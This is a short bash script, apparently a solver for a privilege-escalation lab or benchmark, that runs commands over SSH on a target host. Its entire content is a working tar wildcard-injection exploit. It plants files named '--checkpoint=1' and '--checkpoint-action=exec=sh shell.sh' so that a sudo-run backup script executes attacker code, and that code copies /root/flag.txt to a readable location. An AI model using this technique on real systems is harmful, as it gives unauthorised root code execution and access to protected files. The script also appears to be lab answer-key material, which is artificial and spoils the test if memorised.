#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
cd /opt/bench/backups
rm -f /tmp/backup_flag shell.sh
cat > shell.sh <<'\''EOF'\''
#!/bin/sh
cat /root/flag.txt > /tmp/backup_flag
EOF
chmod +x shell.sh
touch -- --checkpoint=1
touch -- "--checkpoint-action=exec=sh shell.sh"
sudo -n /opt/bench/backup.sh
for i in $(seq 1 10); do
  if test -r /tmp/backup_flag && grep -q FLAG /tmp/backup_flag 2>/dev/null; then
    cat /tmp/backup_flag
    exit 0
  fi
  sleep 1
done
exit 1
')"
assert_root_output "${out}"
